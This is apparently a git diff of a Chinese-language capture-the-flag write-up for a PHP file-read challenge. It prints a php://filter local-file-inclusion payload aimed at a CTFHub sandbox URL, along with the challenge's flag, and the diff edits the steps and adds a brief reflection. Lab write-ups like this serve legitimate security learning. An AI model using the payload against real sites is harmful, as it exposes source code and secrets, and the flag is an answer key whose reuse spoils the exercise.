@@ -75,7 +75,7 @@ layout: null
     //n1book{afr_1_solved}
     ```
 
-6. 注释里就是 flag，获得flag
+6. 注释里就是 flag
 
 ### Payload
 
@@ -83,16 +83,10 @@ layout: null
 GET /?p=php://filter/convert.base64-encode/resource=flag HTTP/1.1
 ```
 
-完整地址
+本次地址
 
 ```
 http://challenge-7658aefcd8b703bf.sandbox.ctfhub.com:10800/?p=php://filter/convert.base64-encode/resource=flag
-```
-
-返回的 base64 解码后就是源码
-
-```
-PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9Cg==
 ```
 
 ### flag
@@ -100,3 +94,5 @@ PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9Cg==
 n1book{afr_1_solved}
 
 ### 总结&反思
+
+这题我算是第一次见，是一个简单题但是对我还是很效果，让我对一些基础的操作有了更多的认识。
